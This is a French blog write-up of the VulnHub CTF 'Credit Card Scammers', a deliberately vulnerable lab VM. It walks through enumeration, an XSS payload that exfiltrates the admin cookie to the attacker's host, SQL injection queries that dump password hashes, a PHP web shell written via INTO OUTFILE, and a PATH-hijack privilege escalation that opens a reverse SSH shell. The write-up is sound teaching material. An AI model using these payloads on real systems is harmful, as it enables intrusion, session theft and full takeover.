# Solution du CTF Credit Card Scammers de VulnHub

Scammers gonna scam
-------------------

[Credit Card Scammers](https://www.vulnhub.com/entry/credit-card-scammers-1,479/) est un CTF téléchargeable sur VulnHub et créé par un certain [Thomas Williams](https://www.bootlesshacker.com/).  

Sur fond d'arnaque lié au COVID-19 on doit pénétrer le serveur des scammers et obtenir 3 flags.  

```plain
$ sudo nmap -p- -sC -sV -T5 192.168.56.116
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.116
Host is up (0.00041s latency).
Not shown: 65449 filtered tcp ports (no-response), 82 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:0a:3a:42:5f:92:47:69:33:59:b3:77:53:3c:be:73 (RSA)
|   256 ab:3d:26:3b:d9:02:50:a4:49:c0:bf:13:75:dc:a5:73 (ECDSA)
|_  256 fb:6a:7e:1b:05:f9:d1:ef:be:dd:ff:39:ed:f5:f5:63 (ED25519)
80/tcp   open   http       Apache httpd 2.4.37 ((centos))
|_http-title: Your PPE Supplier
|_http-server-header: Apache/2.4.37 (centos)
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  closed https
9090/tcp closed zeus-admin
```

On a ici un firewall qui filtre les ports, pas forcément commun sur un CTF de ce type.  

La page d'accueil du site permet juste d'acheter différents objets liés au COVID (masque, gel hydroalcoolique, etc).  

Un formulaire de paiement est présent sur le site mais ni un test manuel ni une utilisation de [Wapiti](https://github.com/wapiti-scanner/wapiti) ne remontent de vulnérabilités apparentes.  

J’enchaîne donc sur une énumération web à l'aide de la wordlist *directory-list-2.3-big.txt* fournie avec ce vénérable DirBuster.  

```plain
301        7l       20w      234c http://192.168.56.116/img
200      159l      461w     5822c http://192.168.56.116/index.html
301        7l       20w      234c http://192.168.56.116/css
301        7l       20w      237c http://192.168.56.116/vendor
301        7l       20w      239c http://192.168.56.116/settings
301        7l       20w      236c http://192.168.56.116/class
200        0l        0w        0c http://192.168.56.116/class/user.php
200        0l        0w        0c http://192.168.56.116/class/order.php
200       21l      172w     1093c http://192.168.56.116/LICENSE
301        7l       20w      243c http://192.168.56.116/class/smarty
```

Intéressant, le site semble utiliser le moteur de templates *Smarty*. Est-ce que l'on serait en présence d'une vulnérabilité de type SSTI (Server Side Template Injection) ?  

En fouillant pour les CVE liés à ce software je suis tombé au bout d'un moment sur [un article décrivant plusieurs cas d'exploitation](https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html) mais rien n'a aboutit.  

J'ai bien sûr aussi testé [la syntaxe de base du moteur de template](https://www.smarty.net/docs/en/language.syntax.variables.tpl).  

A noter que la soumission du formulaire ne provoque aucun output particulier, il a donc fallut tester avec des commandes telles que curl/wget/sleep pour voir si une exécution de commande avait bien lieu.  

Ce ne fut pas le cas.  

Here comes a new challenger
---------------------------

Bien sûr j'ai tenté aussi l'injection XSS avec un payload tel que   

```html
<script src="//192.168.56.1:8000/fname"></script>
```

Aucun retour ! Ah !  

Un nouveau scan de port fait cette fois apparaître un nouveau venu sur le port 443.  

```plain
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 8d:0a:3a:42:5f:92:47:69:33:59:b3:77:53:3c:be:73 (RSA)
|   256 ab:3d:26:3b:d9:02:50:a4:49:c0:bf:13:75:dc:a5:73 (ECDSA)
|_  256 fb:6a:7e:1b:05:f9:d1:ef:be:dd:ff:39:ed:f5:f5:63 (ED25519)
80/tcp   open   http       Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Your PPE Supplier
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp  open   http       Mongoose httpd
9090/tcp closed zeus-admin
```

Nmap y voit du [Mongoose](https://en.wikipedia.org/wiki/Mongoose_(web_server)) mais aucun entête ne permet de vérifier cette information. On obtient juste une réponse étrange :  

```plain
$ curl -D- http://192.168.56.116:443/
HTTP/1.1 404 Not Found
Cache: no-cache
Content-Length: 363
Content-Type: text/plain

Unknown Command - {"headers":{"Accept":"*/*","Host":"192.168.56.116:443","User-Agent":"curl/7.80.0"},"httpVersion":"1.1","method":"GET","url":"/","urlParsed":{"anchor":"","query":"","file":"","directory":"/","path":"/","relative":"/","port":"","host":"","password":"","user":"","userInfo":"","authority":"","protocol":"","source":"/","queryKey":{},"chunks":[""]}}
```

Le serveur semble avoir du mal à traiter la charge face à un buster quelconque mais on trouve des URLs telles que *status*, *session*, *sessions* ou encore *shutdown* (qui semble avoir un effet assez radical sur le serveur lol).  

Ça ressemble à du *Selenium* en remote. *Selenium* est grosso-modo un wrapper permettant d'automatiser différents browsers headless et il a un mécanisme de session qui ressemble à ça.  

La requête suivante a finit de me convaincre :  

```javascript
$ curl -s http://192.168.56.116:443/sessions | python3 -m json.tool
{
    "sessionId": null,
    "status": 0,
    "value": [
        {
            "id": "9118cd60-6309-11ec-abba-1b04047d7329",
            "capabilities": {
                "browserName": "phantomjs",
                "version": "2.1.1",
                "driverName": "ghostdriver",
                "driverVersion": "1.2.0",
                "platform": "linux-unknown-64bit",
                "javascriptEnabled": true,
                "takesScreenshot": true,
                "handlesAlerts": false,
                "databaseEnabled": false,
                "locationContextEnabled": false,
                "applicationCacheEnabled": false,
                "browserConnectionEnabled": false,
                "cssSelectorsEnabled": true,
                "webStorageEnabled": false,
                "rotatable": false,
                "acceptSslCerts": false,
                "nativeEvents": true,
                "proxy": {
                    "proxyType": "direct"
                }
            }
        }
    ]
}
```

Ici le browser utilisé est *PhantomJS* qui a l'avantage n'être réellement headless (par opposition à des Chrome et Firefox qui vont nécessiter un tas de dépendances graphiques). Par contre le projet est mort depuis un moment.  

Je me souviens avoir vu des vulnérabilités le concernant à un moment donc je suis penché dessus.  

Le truc le plus bateau c'est de tester le schéma *file://* car comme dirait *Jean-Clause Dus*, *sur un malentendu ça peut marcher*.  

```python
from time import sleep

from selenium import webdriver

driver = webdriver.Remote(
    command_executor='http://192.168.56.116:443/wd/hub'
)

driver.get("file:///etc/passwd")
sleep(2)
print(driver.page_source)

driver.quit()
```

Échec ! J'ai ensuite testé [une faille qui consiste à demander le fichier via une requête Ajax](https://github.com/h4ckologic/CVE-2019-17221/blob/master/PhantonJS_Arbitrary_File_Read.pdf) et [différentes vulnérabilités de download/upload sur Selenium](https://github.com/JonStratton/selenium-node-takeover-kit/) (toutes ne s'appliquent pas à PhantomJS).  

On ne s'en sort jamais de ces énumérations
------------------------------------------

Nouvelle énumération web, cette fois avec la wordlist *raft-large-directories.txt* :  

```plain
200       60l      174w     3658c http://192.168.56.116/_admin/dist/login.html
302        0l        0w        0c http://192.168.56.116/_admin/dist/index.php
302        0l        0w        0c http://192.168.56.116/_admin/dist/logout.php
302        0l        0w        0c http://192.168.56.116/_admin/dist/
302        0l        0w        0c http://192.168.56.116/_admin/dist/manage.php
```

On a trouvé une interface admin ! Youpi on avance !  

Malheureusement elle ne semble pas plus vulnérable que la page d'accueil.  

La présence de Selenium semble quand même supposer qu'il y a du XSS dans l'air : à quoi bon l'utiliser si ce n'est pour faire exécuter du javascript ?  

J'ai donc procédé une nouvelle fois à l'injection XSS mais cette fois en spécifiant un port plus standard :  

```javascript
<script>var img = document.createElement("img"); img.src = "http://192.168.56.1/?" + encodeURI(document.cookie); document.body.appendChild(img);</script>
```

Finalement j'ai obtenu la réponse que j'attendais :  

```plain
192.168.56.1 - - [22/Dec/2021 13:28:11] "GET /?PHPSESSID=ng7d02qbbl7jucjgc2motad5qp HTTP/1.1" 200 -
```

Une fois le cookie réutilisé dans le navigateur j’accède à l'interface d'administration qui se divise en deux parties :  

* le dashboard qui affiche les informations soumises par les personnes scammées
* la gestion de la base de données qui permet d'exécuter des requêtes SQL sans obtenir leur output

Via le tableau HTML du dashboard et les noms de colonnes on devine qu'il y a une table *orders* avec au moins un champ nommé *cvv*. Je tente donc une simple édition :  

![Credit Card Scammers VulnHub CTF admin interface](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/scammers.png)

```plain
update orders set cvv=current_user();
```

Et de retour au dashboard je vois que la valeur est devenue *orders@%*.  

Extraction des bases de données, tables, colonnes et finalement users/passwords :  

```plain
update orders set cvv=(select group_concat(schema_name) from information_schema.schemata);
select group_concat(table_name) from information_schema.tables where table_schema='orders';
select group_concat(column_name) from information_schema.columns where table_schema='orders' and table_name='users';
select group_concat(concat_ws(0x7c, userName, password)) from users;
```

Ce qui nous donne finalement ce bel output :  

```plain
admin|$2y$12$A4jqwtWB73.TAMIeplx0T.5oG/mnHR1qTDa8cmtTIvW3ZTjdSjdjC,m0n3y6r4bb3r|$2y$12$EX/FDsztTMwftzPRyY8gFuM7ZjAphQRZs88qpZpmboRogOAOYXowC
```

Le hash de l'utilisateur *m0n3y6r4bb3r* finit par tomber à l'aide de JtR (c'est quand même du Blowfish) : *delta1*.  

SQLmap parvient à extraire des infos lui aussi mais via time-based. J'en ait profité pour dumper les privilèges de l'utilisateur courant (via *--privileges*).  

```plain
database management system users privileges:
[*] %orders% [1]:
    privilege: FILE
```

On ne l'aurait pas forcément deviné puisqu'on ne tourne pas avec l'utilisateur *root*.  

Plus qu'à dumper un shell PHP sur le serveur. A la racine web ça fonctionne :  

```plain
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/yolo.php';
```

Ça va mieux
-----------

Sur le système on remarque un utilisateur nommé *moneygrabber* et le mot de passe *delta1* est accepté, il est donc possible de se connecter via SSH :)  

Petite chasse aux flags :  

```bash
[moneygrabber@ppeshop tmp]$ find / -iname "flag*.txt" 2> /dev/null 
/var/www/flag1.txt
/home/moneygrabber/flag2.txt
```

Soit les chaînes respectives*WPamTh2Y9uMdphb6z0cp* et *9N8U10EAVU10cbSZPCRv*.  

*LinPEAS* montre rapidement du doigt un binaire setuid inhabituel ainsi qu'un script qui semble lié :  

```plain
-rwsr-xr-x. 1 root root 17K May  9  2020 /usr/bin/backup (Unknown SUID binary)
/home/moneygrabber/backup.sh
```

Ce script de backup est la propriété de *root* et nous ne pouvons pas le modifier. Voici son contenu :  

```bash
#!/bin/bash
tar -cf mysql.tar /var/lib/mysql
sleep 30
```

Pour ce qui est du binaire :  

```plain
[moneygrabber@ppeshop ~]$ strings /usr/bin/backup
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
[]A\A]A^A_
/home/moneygrabber/backup.sh
;*3$"
GCC: (GNU) 8.3.1 20190507 (Red Hat 8.3.1-4)
```

Cet exécutable appelle le script avec le path complet mais ensuite le script utilise des utilitaires sans leur path. On va donc exploiter cette faiblesse en écrivant un script que l'on nommera *tar* et sera appelé à la place du vrai.  

Je lance d'abord [ReverseSSH](https://github.com/Fahrj/reverse-ssh) en local :  

```plain
$ sudo ./reverse-sshx64 -l -v -p 443
2021/12/22 21:54:15 Starting ssh server on :443
2021/12/22 21:54:15 Success: listening on [::]:443
```

Sur la VM :  

```plain
[moneygrabber@ppeshop ~]$ cat tar
#!/usr/bin/bash
./reverse-sshx64 -v -p 443 192.168.56.1
[moneygrabber@ppeshop ~]$ chmod 755 tar
[moneygrabber@ppeshop ~]$ export PATH=.:$PATH
[moneygrabber@ppeshop ~]$ /usr/bin/backup
```

E.T. téléphone maison :  

```plain
2021/12/22 21:54:42 Successful authentication with password from reverse@192.168.56.116:34922
2021/12/22 21:54:42 Attempt to bind at 127.0.0.1:8888 granted
2021/12/22 21:54:42 New connection from 192.168.56.116:34922: root on ppeshop reachable via 127.0.0.1:8888
```

Et enfin (le mot de passe demandé est celui par défaut de ReverseSSH) :  

```plain
$ ssh -p 8888 127.0.0.1
The authenticity of host '[127.0.0.1]:8888 ([127.0.0.1]:8888)' can't be established.
RSA key fingerprint is SHA256:3qx1PQUheJi+syVb+vtVrdyjSlIAd7hTZnPyV4kyZYg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:8888' (RSA) to the list of known hosts.
devloop@127.0.0.1's password: 
[root@ppeshop moneygrabber]# id
uid=0(root) gid=1000(moneygrabber) groups=1000(moneygrabber)
[root@ppeshop moneygrabber]# cd /root
[root@ppeshop root]# ls
anaconda-ks.cfg  flag3.txt  ghostdriver.log
[root@ppeshop root]# cat flag3.txt 
y2zmGeGjrA4dbDj4wBWr

[root@ppeshop scripts]# crontab -l
@reboot python2 /scripts/xss.py
```

De l'autre côté du miroir
-------------------------

Voici le script Selenium qui était utilisé :  

```python
#!/usr/bin/python2
import time
from selenium import webdriver
time.sleep(120)
driver = webdriver.PhantomJS(port=443)
driver.get("http://localhost/_admin/dist/index.php")
driver.find_element_by_id('username').send_keys('admin')
driver.find_element_by_id('password').send_keys('VerySecureUnhackablePassword!')
driver.find_element_by_id('username').submit()

while 1:
    driver.get("http://localhost/_admin/dist/index.php")
    html_source = driver.page_source
    time.sleep(15)

driver.quit()
```

Le problème de conception sur ce CTF c'est que si on bourrine le formulaire de paiement sur le site alors la page requêtée par PhantomJS devient énorme et ce dernier se fait tuer en Out Of Memory. Heureusement le message d'erreur généré par le kernel se voit dans le terminal de la VM et on peut alors la reconfigurer pour ajouter de la RAM mais ce type de problème peut suffire à pourrir un CTF.  

Mon autre critique sera lié au fait que le port 443 soit laissé accessible ce qui laisse penser qu'il y a moyen d'un tirer quelque chose alors que ce n'est pas le cas.  

Pour le fun j'ai écrit un scanner de port qui utilise l'API exposée du Selenium et le fait que le protocole *data://* est autorisé :  

```python
from time import sleep
import re
from base64 import b64encode

from selenium import webdriver

driver = webdriver.Remote(
    command_executor='http://192.168.56.116:443/wd/hub'
)

page = """<body>
    <div id="portscan"></div>
    <script>
        function ping(port) {
            portscan_div = document.getElementById("portscan");
            portscan_div.innerHTML = '';
            for (var i = 0; i < 100; i++) {
                var img = document.createElement("img");
                img.src = "http://192.168.56.1:" + (port + i) + "/" + new Date().getMilliseconds();;
                portscan_div.appendChild(img);
            }
            setTimeout(ping, 10000, port+100);
        }

        setTimeout(ping, 1, 1);
    </script>"""

url = f"data:text/html;base64,{b64encode(page.encode()).decode()}"
driver.get(url)
driver.set_page_load_timeout(60)

current_port = ""
try:
    while True:
        search = re.search(r":\d+", driver.page_source)
        if search:
            new_port = search.group()
            if new_port != current_port:
                current_port = new_port
                print(f"Current port: {current_port}")
        sleep(2)
except KeyboardInterrupt:
    print(driver.page_source)

driver.quit()
```

Il faut mettre son interface réseau en écoute pour voir les paquets qui arrivent bien à destination (et ne sont donc pas filtrés).  

C'est loin d'être une science exacte : Selenium c'est bien pour des tests d'intégration mais il faut pas trop chercher à le pousser.  


*Published December 23 2021 at 18:08*